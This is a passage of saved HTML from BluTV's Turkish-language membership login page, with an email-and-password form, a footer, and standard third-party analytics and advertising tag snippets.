    ._3XYbTXhnKqYybHudydJNJo ._1ParNVImgDUOEG9GUL-0vm ._8JLwnFngmfhazJyTvpMUw {
      font-size: 16px; }
  ._2Urpk462RLB9Sib_Sf_E3h {
    padding: 16px; } }
</style><script type="text/javascript" src="https://vsh.visilabs.net/Visilabs.min.js?sid=4A4D524D563636652F47413D&amp;oid=4542536B335430716959513D"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/963446000/?random=1557816994796&amp;cv=9&amp;fst=1557816994796&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=768&amp;u_w=1366&amp;u_ah=768&amp;u_aw=1366&amp;u_cd=24&amp;u_his=3&amp;u_tz=180&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa521&amp;sendb=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fwww.blutv.com.tr%2F&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;tiba=BluTV%20-%20T%C3%BCrkiye'nin%20%C4%B0nternet%20Televizyonu&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="//dev.visualwebsiteoptimizer.com/j.php?a=268332&amp;u=https%3A%2F%2Fwww.blutv.com.tr%2F&amp;f=1&amp;r=0.035206502876572454" type="text/javascript"></script><script src="//dev.visualwebsiteoptimizer.com/5.0/va-c39a6ce29f98acd4e24145bd6d59b977.js" crossorigin="anonymous" type="text/javascript"></script><script async="" src="https://script.hotjar.com/modules.fe4e24d660b38f9620b9.js"></script><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style></head>

	<body class="body-ltr" data-platform="blutv">
		<!----><div ui-view="root"></div>

		<!-- Header -->
		<!----><header class="header" ui-view="header" ng-hide="elementHide" aria-hidden="false"><div class="container"><a ng-href="/" target="_self" aria-label="BluTV" class="blutv-logo white" href="/"></a><!----><div class="nav-right" ng-if="$root.appRegion === 'blutv'"><div class="callcenter"><em class="icon icon-phone-receiver"></em><p translate-cloak="" class="">Müşteri Hizmetleri <span>0850 210 52 58</span></p></div></div><!----><!----></div></header>

		<!-- Content -->
		<!----><main class="container page" ui-view="content"><div class="account-upside" ng-class="{'upside-lama' : $root.appRegion !== 'blutv'}"><h1 class="upside-title" translate-cloak="">Üyelik Girişi</h1></div><div class="account-container"><div class="container"><div class="center-form col-tp-7 col-tl-6 col-d-5"><form class="ng-pristine ng-valid-email ng-invalid ng-invalid-required ng-valid-pattern" method="POST"><ol class="uxq-list"><li class="one-whole"><label class="item item-focus item-default" ng-class="{true: 'has-error'}[Submit &amp;&amp; loginForm.username.$invalid]"><span class="item-label" translate-cloak="">E-posta Adresiniz</span><input id="loginform_email" type="email" name="login" ng-model="loginModel.username" ng-pattern="/^((&quot;[\w-\s]+&quot;)|([\w-]+(?:\.[\w-]+)*)|(&quot;[\w-\s]+&quot;)([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i" class="one-whole ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-valid-pattern ng-touched" placeholder="E-posta Adresiniz" required="" aria-invalid="true"> <span class="error-block top ng-hide" ng-show="Submit &amp;&amp; loginForm.username.$error.required" aria-hidden="true">E-posta Yazınız</span> <span class="error-block top ng-hide" ng-show="Submit &amp;&amp; loginForm.username.$error.pattern" aria-hidden="true">Hatalı E-posta Adresi</span></label></li><li class="one-whole"><label class="item item-focus item-default" ng-class="{true: 'has-error'}[Submit &amp;&amp; loginForm.password.$invalid]"><span class="item-label" translate-cloak="">Şifre</span> <input id="loginform_password" type="password" name="password" ng-model="loginModel.password" ng-enter="$root.userLogin(loginForm)" class="one-whole ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="Şifre" required="" aria-invalid="true"> <span class="error-block top ng-hide" ng-show="Submit &amp;&amp; loginForm.password.$error.required" aria-hidden="true">Şifrenizi Yazınız</span></label></li><li class="one-whole"><br><div class="float-left"><label class="item item-field is-checkbox"><input id="loginform_remember" ng-model="loginModel.remember" type="checkbox" aria-label="Beni Hatırla" ng-init="loginModel.remember=true" ng-true-value="true" ng-false-value="false" aria-checked="true" class="ng-pristine ng-untouched ng-valid ng-not-empty" aria-invalid="false"> <span class="item-label" translate-cloak="">Beni Hatırla</span></label></div><a id="loginform_forgetpassword" ui-sref="root.sifremi-unuttum" class="float-right" translate-cloak="" href="/sifremi-unuttum">Şifremi Unuttum</a></li><li class="one-whole"><button id="loginform_submit" type="submit" ng-click="Submit=true" ng-loading-btn="$root.userLoginSubmit" class="button primary-action one-whole" aria-label="Login Button" translate-cloak="">Giriş Yap<span class="btn-spinner"></span></button></li><li class="one-whole align-center" translate-cloak="">BluTV'de yeni misiniz? <a id="loginform_registerbutton" ui-sref="root.kayit" translate-cloak="" class="" href="/kayit">Şimdi üye olun!</a></li></ol></form></div></div></div></main>

		<!-- Detail -->
		<!----><section ui-view="detail"></section>

		<!-- Footer -->
		<!----><footer class="footer" ui-view="footer" ng-hide="elementHide" aria-hidden="false"><div class="account-footer"><div class="container"><img cdn-asset="Assets" ng-src="/assets/images/logo.norton.png" width="90" alt="Norton Secured" src="https://blutv-objects.mncdn.com/assets/images/logo.norton.png?v=1.50.2"> <img cdn-asset="Assets" ng-src="/assets/images/logo.dogan.png" width="45" alt="Doğan TV" src="https://blutv-objects.mncdn.com/assets/images/logo.dogan.png?v=1.50.2"></div></div></footer>

		<!-- Page Load -->
		<div class="pageload hide">
			<span id="loader-inner">
				<span class="rotation-spinner"></span>
			</span>
		</div>

		<!-- Indicator -->
		<div id="indicator" class="indicator hide">
			<div class="indicator-cell">
				<div class="indicator-box">
					<img ng-src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAM4AAABECAMAAAD+6vpIAAAC2VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8Xe6ihAAAA8nRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTk9QUVJTVFVWV1hZWltcXV9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4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" alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAM4AAABECAMAAAD+6vpIAAAC2VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8Xe6ihAAAA8nRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTk9QUVJTVFVWV1hZWltcXV9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4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">
					<div class="indicator-cycle">
							<div class="inner one"></div>
							<div class="inner two"></div>
							<div class="inner three"></div>
					</div>
				</div>
			</div>
		</div>

		<!-- Footer -->
		<!----><div ui-view="alert"><div ng-show="alertMessage" class="alert-wrap ng-hide" aria-hidden="true"><div class="alert alert- alert-dismissible"><button type="button" class="close alert-close">×</button><div class="alert-message"> <span ng-show="alert.action == 'login'" ng-html-compile="'AlertLoginText' | translate" aria-hidden="true" class="ng-hide">Lütfen <a href="/giris">üye girişi yapın.</a></span></div></div></div></div>

		<!-- Cookies Popover -->
		<div id="cookies-popover" ng-show="!elementHide" ng-cookies-popover="" aria-hidden="false"></div>

		<script type="text/ng-template" id="cookiesPopover.html">
			<div class="popover">
				<div class="popover-content">
					<span ng-click="popoverDataClose()" class="cookies-close">&times;</span>
					<p ng-html-compile="'cookiesNote' | translate"></p>
				</div>
			</div>
		</script>


		<link rel="preload" href="https://tracker.blutv.com/track.js?v=1" as="script">

					<!-- Blupoint Stats -->
			<script>
				(function(b, l, u) {window['BluTrackerObject']=u;
				window[u]=window[u]||function(){(window[u].q = window[u].q || [])
				.push(arguments)};s=document.createElement(b);s.async=1;s.src=l;
				t=document.getElementsByTagName(b)[0];t.parentNode.insertBefore(s,t);
				})('script', 'https://tracker.blutv.com/track.js?v=1', 'bluTrack');
			</script>
		
		<!-- Scripts -->
		<script type="text/javascript">
			var _config = {
				'API_URI' 		: "",
				'BASE_URL' 		: "/",
				'REDIRECT'		: "https://www.dsmartgo.com.tr",
				'APP_VER'		: "400",
				'ASSET_URI'		: "/assets",
				'ASSET_VER'		: "1.50.2",
				'ASSET_CDN'		: "https://blutv-objects.mncdn.com",
				'ASSET_VIDEO'	: "https://blutv.akamaized.net/kdv/S8/MP4/BLU/",
				'ASSET_STATIC'	: "https://blutv-player.akamaized.net",
				'IMAGE_CDN'		: "https://blutv-images.mncdn.com/q/t/i/bluv2"
			};

			function loadJS(e,t,n){"use strict";var i=window.document.createElement("script");var o=t||window.document.getElementsByTagName("script")[0];i.type="text/javascript";i.src=e;i.async=true;o.parentNode.insertBefore(i,o);setTimeout(function(){i.media=n||"all"}), 500}
		</script>

		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/js/plugins/jquery-3.3.1.min.js?v=400" as="script">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/js/plugins/lazyload.min.js?v=400" as="script">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/js/plugins/picturefill.min.js?v=400" as="script">
		<script async="" src="https://blutv-objects.mncdn.com/assets/js/plugins/jquery-3.3.1.min.js?v=400"></script>
		<script async="" src="https://blutv-objects.mncdn.com/assets/js/plugins/lazyload.min.js?v=400"></script>
		<script async="" src="https://blutv-objects.mncdn.com/assets/js/plugins/picturefill.min.js?v=400"></script>

		
					<script type="text/javascript" src="https://blutv-player.mncdn.com/q/s/player/html5/1.19.1.1/assets/js/docs.min.js"></script>
			<script type="text/javascript" src="https://blutv-objects.mncdn.com/assets/player/player.js?v=400"></script>
			<script type="text/javascript" src="https://blutv-objects.mncdn.com/assets/js/plugins/components/detail.js?v=400"></script>
			<!--<script type="text/javascript" src="http://192.168.10.19:8000/dist/components/detail.js"></script>-->
		
					<script type="text/javascript" src="https://blutv-objects.mncdn.com/assets/js/plugins/components/tvod.js?v=400"></script>
			<!--<script type="text/javascript" src="http://192.168.10.19:8000/dist/components/tvod.js"></script>-->
		
					<!-- AdForm -->
			<script type="text/javascript">
				window._adftrack = Array.isArray(window._adftrack) ? window._adftrack : (window._adftrack ? [window._adftrack] : []);

				function adFormInit(page, item, price) {
					if (page === 'olustur') {
						window._adftrack.push({
							pm: 629936,
							divider: encodeURIComponent('|'),
							pagename: encodeURIComponent('BluTV - Kayit'),
							order : {
								id: item,
								orderid: item
							}
						});
					} else if (page === 'olustur-sonuc') {
						window._adftrack.push({
							pm: 629936,
							divider: encodeURIComponent('|'),
							pagename: encodeURIComponent('BluTV - Ödeme'),
							order : {
								sales: item,
								currency: price
							}
						});
					}
				}

				(function (){
					var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = 'https://track.adform.net/serving/scripts/trackpoint/async/';
					var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
				})();
			</script>

			<!-- Google Analytics -->
			<script type="text/javascript">
				window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
				ga('create', 'UA-72558437-1', 'auto');
			</script>

			<!-- Google Tag Manager -->
			<link rel="preload" href="//www.googletagmanager.com/gtm.js?id=GTM-PH2G8V" as="script">
			<script type="text/javascript">
				function executeGTM(){
					(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
					new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
					j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
					'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
					})(window,document,'script','dataLayer','GTM-PH2G8V');
				}
				window.dataLayer = window.dataLayer || [];
				window.dataLayer.push({
					'event': 'PW',
					'loadType': 'Static'
				});
			</script>

			<!-- Global site tag (gtag.js) - Google AdWords: 963446000 -->
			<link rel="preload" href="//www.googletagmanager.com/gtag/js?id=AW-963446000" as="script">
			<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-963446000"></script>

			<script>
				window.dataLayer = window.dataLayer || [];
				function gtag(){dataLayer.push(arguments);}
				gtag('js', new Date());
				gtag('config', 'AW-963446000');
			</script>

			<!-- Mobile Ödeme A/B Test -->
			<script type="text/javascript">
				window.VWO = window.VWO || []; window.VWO.push(['updateSettings',{},{}]);
			</script>

			<!-- Heap -->
			<link rel="preload" href="//cdn.heapanalytics.com/js/heap-2073344115.js" as="script">
			<script type="text/javascript">
				window.heap = window.heap||[],
				heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=t.forceSSL||"https:"===document.location.protocol,a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=(r?"https:":"http:")+"//cdn.heapanalytics.com/js/heap-"+e+".js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(a,n);for(var o=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","removeEventProperty","setEventProperties","track","unsetEventProperty"],c=0;c<p.length;c++)heap[p[c]]=o(p[c])};
				window.heap.load('2073344115');
			</script>

			<!-- Visilab -->
			<script type="text/javascript">
				var _vl = false;
				function OnVisilabsLoaded(){ _vl = true, vl = new Visilabs(); vl.Collect(); };
			</script>

			<!-- Twitter -->
			<link rel="preload" href="//static.ads-twitter.com/uwt.js" as="script">
			<script type="text/javascript">
				!function(e,t,n,s,u,a){e.twq||(s=e.twq=function()
				{s.exe?s.exe.apply(s,arguments):s.queue.push(arguments); },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js', a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}
				(window,document,'script');

				window.twq('init', 'nv0nx');
				window.twq('track', 'PageView');
			</script>

			<!-- Criteo -->
			<script type="text/javascript">
				window.criteo_q = window.criteo_q || [];
				var deviceType = /iPad/.test(navigator.userAgent) ? "t" : /Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Silk/.test(navigator.userAgent) ? "m" : "d";
			</script>

			<!-- Smart Banner -->
			<link rel="preload" href="https://blutv-objects.mncdn.com/assets/js/plugins/smart-app-banner.js?v=400" as="script">
			

			<link rel="preload" href="//static.ads-twitter.com/oct.js" as="script">
			<link rel="preload" href="//c.supert.ag/p/0002f2/supertag.js" as="script">
			<script type="text/javascript">
				//loadJS("//www.google-analytics.com/analytics.js");
				//loadJS("//www.googleadservices.com/pagead/conversion_async.js");
				loadJS("//static.ads-twitter.com/oct.js");
				loadJS("//c.supert.ag/p/0002f2/supertag.js");
			</script>

							<link rel="preload" href="//static.criteo.net/js/ld/ld.js" as="script">
				<script type="text/javascript">
					loadJS("//static.criteo.net/js/ld/ld.js");
				</script>
			
			<noscript>
				<!-- Facebook Pixel Code -->
				<img rel="dns-prefetch" height="1" width="1" style="display:none" aria-hidden="true" alt="" src="//www.facebook.com/tr?id=1612708812183031&ev=PageView&noscript=1" />

				<!-- Twitter universal website tag code -->
				<img rel="dns-prefetch" height="1" width="1" style="display:none" aria-hidden="true" alt="" src="//analytics.twitter.com/i/adsct?txn_id=nwcrt&p_id=Twitter&tw_sale_amount=0&tw_order_quantity=0" />
				<img rel="dns-prefetch" height="1" width="1" style="display:none;" aria-hidden="true" alt="" src="//t.co/i/adsct?txn_id=nwcrt&p_id=Twitter&tw_sale_amount=0&tw_order_quantity=0" />

				<!-- Yandex Script -->
				<!--<div><img src="//mc.yandex.ru/watch/34859780?ut=noindex" style="position:absolute; left:-9999px;"/></div>-->
			</noscript>
		
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/js/blutv.min.js?v=400" as="script">
		<script type="text/javascript">
			window._oldDocumentTitle = document.title;
			window.setDocumentTitle = function(title) {
				if (title && document.title !== title) {
					window._oldDocumentTitle = document.title;
					document.title = title;
				}
			};

			window.backDocumentTitle = function() {
				var title = window._oldDocumentTitle;

				window._oldDocumentTitle = null;
				window.setDocumentTitle(title);
			};

			function getMobileOperatingSystem() {
				var userAgent = window.navigator.userAgent || window.navigator.vendor || window.window.opera;

				if (/windows phone/i.test(userAgent)) {
					return 'Windows Phone';
				}
				if (/android/i.test(userAgent)) {
					return 'Android';
				}
				if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
					return 'iOS';
				}
				return null;
			}

			if(getMobileOperatingSystem()) {
				document.body.classList.add('body-loading');
				document.getElementById('indicator').classList.add('show');
			}

			loadJS("https://blutv-objects.mncdn.com/assets/js/blutv.min.js?v=400");
		</script>

		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/blutv.woff2?v=400" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Light.woff2?v=400" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Regular.woff2?v=400" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Medium.woff2?v=400" as="font" type="font/woff2" crossorigin="">
